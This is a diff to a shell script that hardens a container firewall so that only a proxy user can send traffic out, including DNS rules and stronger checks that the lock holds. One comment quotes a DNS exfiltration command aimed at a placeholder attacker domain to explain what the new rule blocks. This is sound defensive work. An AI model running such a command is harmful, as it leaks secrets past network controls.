@@ -49,9 +49,22 @@ ip6tables -A OUTPUT -o lo -j ACCEPT
 
 # --- IPv4 base allows ---
 iptables -A INPUT  -i lo -j ACCEPT
+# Block non-proxy processes from the embedded Docker DNS resolver (127.0.0.11):
+# a blanket loopback-OUTPUT accept would let any process tunnel data out via DNS
+# queries (`dig $(secret).attacker.tld`) that Docker forwards to the host's upstream
+# resolvers, bypassing the squid hostname allowlist entirely. The proxy UID (which
+# does the real name resolution for allowed hosts) is exempted; every other loopback
+# service stays reachable (incl. squid on 3128). DNS is UDP with TCP fallback, so
+# both are dropped. Insert BEFORE the blanket loopback accept so it takes precedence.
+iptables -A OUTPUT -o lo -d 127.0.0.11 -p udp --dport 53 -m owner ! --uid-owner "$PROXY_USER" -j DROP
+iptables -A OUTPUT -o lo -d 127.0.0.11 -p tcp --dport 53 -m owner ! --uid-owner "$PROXY_USER" -j DROP
 iptables -A OUTPUT -o lo -j ACCEPT
 iptables -A INPUT  -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
-iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+# OUTPUT: accept ESTABLISHED only — NOT RELATED. The proxy UID's blanket ACCEPT
+# below already covers every legitimate outbound flow, so non-proxy UIDs lose
+# nothing by dropping RELATED; this removes the (remote) chance that a conntrack
+# protocol helper could open a RELATED data channel that skips the UID lock.
+iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
 
 # Only the proxy UID may originate outbound traffic; everything else uses the
 # proxy over loopback.
@@ -59,7 +72,8 @@ iptables -A OUTPUT -m owner --uid-owner "$PROXY_USER" -j ACCEPT
 
 # Inbound on forwarded ports, if this project declares any (host browser -> app).
 if [[ -r "$INBOUND_FILE" ]]; then
-  while read -r port; do
+  # `|| [[ -n "$port" ]]` so a final line with no trailing newline is not dropped.
+  while read -r port || [[ -n "$port" ]]; do
     [[ "$port" =~ ^[0-9]+$ ]] && iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
   done < "$INBOUND_FILE"
 fi
@@ -76,8 +90,13 @@ iptables -A EGRESS_DENY -j DROP
 iptables -A OUTPUT -j EGRESS_DENY
 
 # --- Verify the lock took, then drop the sentinel ---
+# Three independent invariants must ALL hold (script runs without `set -e`, so a
+# mid-script `iptables -A` failure can't be assumed to have aborted): default
+# policy is DROP, the proxy-UID ACCEPT exists, and the catch-all EGRESS_DENY jump
+# is present (so a ruleset that silently lost the deny/audit rule fails closed).
 if iptables -S OUTPUT 2>/dev/null | grep -q '^-P OUTPUT DROP' \
-   && iptables -C OUTPUT -m owner --uid-owner "$PROXY_USER" -j ACCEPT 2>/dev/null; then
+   && iptables -C OUTPUT -m owner --uid-owner "$PROXY_USER" -j ACCEPT 2>/dev/null \
+   && iptables -C OUTPUT -j EGRESS_DENY 2>/dev/null; then
   : > "$SENTINEL" 2>/dev/null || true
   echo "[firewall] Egress locked to proxy UID '$PROXY_USER' (IPv4 + IPv6 default-deny, verified)."
 else
